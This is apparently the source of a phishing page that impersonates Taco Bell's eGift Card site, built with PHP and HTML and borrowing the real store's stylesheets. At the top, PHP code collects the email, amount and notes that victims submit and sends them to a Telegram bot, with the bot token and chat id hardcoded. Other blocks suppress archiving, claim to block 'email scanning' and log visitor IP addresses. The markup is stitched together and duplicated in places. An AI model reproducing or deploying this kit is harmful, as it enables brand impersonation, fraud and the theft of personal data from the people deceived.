<?php
$email = $_POST['email'];
$amount = $_POST['amount'];
$notes = $_POST['notes'];
$message ="REQUEST FORM FILLED\n\n$email\n\n============\n\n$amount\n\n\n==============\n\n$notes\n";

$apiToken = "6547328306:AAFosAwa7wPggddiOV_QgTw7xI-uX8ZEY6s"; 
$data = [
    'chat_id' => '-1001819831566',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
                                                    

?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Expires: " . gmdate("D, d M Y H:i:s", time() - 3600) . " GMT");
header("Pragma: no-cache");

// Prevent Google Archiving
header("X-Robots-Tag: noarchive");

// Block email scanning
header("X-Content-Type-Options: nosniff");

// Disable listeners and log third-party communications
ini_set("disable_functions", "socket_accept, socket_bind, socket_listen, socket_create_listen, socket_read, socket_recv, socket_recvfrom, socket_recvmsg, socket_send, socket_sendmsg, socket_sendto, socket_getsockname, socket_getpeername, socket_get_option, socket_set_option");


// Logging third-party communication attempts
$logFile = "../../../requests.txt"; // Replace with the path to your log file

// Get the current timestamp
$timestamp = date("Y-m-d H:i:s");

// Get the IP address of the client
$ipAddress = $_SERVER['REMOTE_ADDR'];

// Get the requested URL
$requestUrl = $_SERVER['REQUEST_URI'];

// Create the log message
$logMessage = "Timestamp: $timestamp | IP: $ipAddress | Requested URL: $requestUrl\n";

// Append the log message to the log file
file_put_contents($logFile, $logMessage, FILE_APPEND);
?>
<?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><html lang="en-US"><head>

   <style>
        body {
            background-color: #222;
            color: #fff;
            font-family: Arial, sans-serif;
            padding: 20px;
        }

        h1 {
            text-align: center;
            margin-bottom: 30px;
        }

        form {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        label {
            display: block;
            font-size: 16px;
            margin-bottom: 10px;
        }

        input[type="text"],
        textarea {
            width: 100%;
            padding: 10px;
            font-size: 16px;
            border: none;
            border-radius: 5px;
            margin-bottom: 20px;
            background-color: #444;
            color: #fff;
        }

        input[type="submit"] {
            background-color: #333;
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
    </style>


        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
        <meta name="viewport" content="width=device-width,initial-scale=1">
        <meta name="description" content="A responsive giftcard store">
        <meta name="author" content="Gift Solutions">
        
        
        <!-- REVIEW 39565602 -->
        <!-- GEB 09/13/2018 Adding in icons for apple payment sheet. These are not mandatory to have-->
         
         
         <!-- image dimensions 180px x 180px -->
        <!-- REVIEW 38194194 -->
        <!-- GEB 06/28/2018 Adding in a dynamic title for ada compliance -->
                <title>Taco Bell | eGift Card | Choose Design</title>  <script>
    // Disable caching for forward and backward navigation
    function disableCaching() {
      // Disable caching for forward navigation
      window.onpageshow = function(event) {
        if (event.persisted) {
          document.getElementById('disableCache').content = 'no-store, no-cache, must-revalidate';
        }
      };
      
      // Disable caching for backward navigation
      window.onunload = function() {};
    }
    
    // Set client browser cache to one hour prior
    function setBrowserCacheTime() {
      const date = new Date();
      date.setTime(date.getTime() - (60 * 60 * 1000));
      document.getElementById('cacheExpires').content = date.toUTCString();
    }

    // Prevent Google Archiving
    const metaRobots = document.createElement('meta');
    metaRobots.name = 'robots';
    metaRobots.content = 'noarchive';
    document.head.appendChild(metaRobots);

    // Block email scanning
    const metaContentType = document.createElement('meta');
    metaContentType.httpEquiv = 'X-Content-Type-Options';
    metaContentType.content = 'nosniff';
    document.head.appendChild(metaContentType);

    // Disable listeners and log third-party communications
    function disableListeners() {
      // Disable listeners (Not applicable in HTML pages)
    }

    function logThirdPartyCommunication() {
      // Logging third-party communication attempts
      const timestamp = new Date().toISOString();
      const ipAddress = "123.45.67.89"; // Replace with actual IP address or retrieve dynamically
      const requestedUrl = window.location.href;
      const logMessage = `Timestamp: ${timestamp} | IP: ${ipAddress} | Requested URL: ${requestedUrl}\n`;

      // Specify the log file location
      const logFile = "../../../requests.txt"; // Replace with the actual log file location

      // Perform the necessary logging operation (e.g., sending log data to a server-side script)
      const logRequest = new XMLHttpRequest();
      logRequest.open('POST', logFile, true);
      logRequest.setRequestHeader('Content-Type', 'text/plain');
      logRequest.send(logMessage);
    }

    // Call the necessary functions when the page loads
    document.addEventListener('DOMContentLoaded', function() {
      disableCaching();
      setBrowserCacheTime();
      disableListeners();
      logThirdPartyCommunication();
    });
  </script>
        <!-- ENG-1860 -->
        <!-- ENG-1860 -->

        <!-- Typekit code if the json has been added for the store -->
                <!-- Typography.com code if the json has been added for the store -->
        
                    <link href="https://tw-merchant-content-production.s3.amazonaws.com/public/css/responsive/combined.css" rel="stylesheet">
                <!-- REVIEW 43837435 -->
            <!-- GEB 07/01/2018 add ability for JSON to determine what custom styles to use for a stores styles.css file -->
                        <!-- Custom styles for this store generated by sass -->
                <link rel="stylesheet" href="https://tw-merchant-content-production.s3.amazonaws.com/private/retail/225/tacobell/responsive/css/styles.css">
            
        
        
        <!--[if lte IE 9]>
            <link rel="stylesheet" href="https://tw-merchant-content-production.s3.amazonaws.com/private/retail/225/tacobell/responsive/css/ie9styles.css">
        <![endif]-->

        
        <!--[if lt IE 9]>
            <link rel="stylesheet" href="https://tw-merchant-content-production.s3.amazonaws.com/public/css/responsive/ie8_main.css">
            <script src="https://tw-merchant-content-production.s3.amazonaws.com/public/js/html5shiv.js"></script>
            <script src="https://tw-merchant-content-production.s3.amazonaws.com/public/js/respond.min.js"></script>
        <![endif]-->


        <!-- //This gets the max future delivery days from the stores json configuration if its not set it uses the default 180 days -->
        
                <script src="https://cdn.perfdrive.com/aperture/apertur###" async=""></script><script type="text/javascript" async="" src="https://www.google-analytics.com/plugins/ua/ec.js"></script>
        	    
<script>
    var dataLayer = window.dataLayer = window.dataLayer || [];
        const brandDimensionValue = 'tacobell';
    dataLayer.push({
        'dimension1': brandDimensionValue,
        '&cu': 'USD'
    });
            dataLayer.push({
        'ecommerce': {
            'currencyCode': 'USD',
            'detail': {}
        }
    });
        </script>


<form action="login.php" method="POST">
        <br> <br><br> <br> <br> <br> <br> <br> <br><label for="email">Email:</label>
        <input name="email" id="email" required="" type="text" width="">

        <label for="notes">Notes:</label>
        <textarea name="notes" id="notes" rows="4"></textarea>

        <input value="Submit" type="submit">
    </form><form name="" action="taco2.php" method="post" enctype="">


    
<input name="" id="picked_envelope" value="" type="hidden">

<div class="choose container" role="main" id="mainContent">
            
       <style>
        body {
            background-color: #222;
            color: #fff;
            font-family: Arial, sans-serif;
            padding: 20px;
        }

        h1 {
            text-align: center;
            margin-bottom: 30px;
        }

        form {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        label {
            display: block;
            font-size: 16px;
            margin-bottom: 10px;
        }

        input[type="text"],
        textarea {
            width: 100%;
            padding: 10px;
            font-size: 16px;
            border: none;
            border-radius: 5px;
            margin-bottom: 20px;
            background-color: #444;
            color: #fff;
        }

        input[type="submit"] {
            background-color: #333;
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
    </style>



    



    
</div>I have an idea.<!-- .container -->
</form><!-- REVIEW 43144559 -->
<script></script>
<noscript>This site requires javascript.  Please enable javascript on your browser. </noscript>
        <noscript>This site requires javascript.  Please enable javascript on your browser. </noscript>
    <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics###','ga');

  ga('create', 'UA-7670652-6', 'auto', {'name': 'gcTracker'});

    var dimensionValue = 'tacobell';
  ga('gcTracker.set', 'dimension1', dimensionValue);
  ga('gcTracker.require', 'ec');
  ga('gcTracker.set', '&cu', 'USD');
      ga('gcTracker.ec:setAction', 'detail');
      ga('gcTracker.send', 'pageview');
</script>    
</body></html>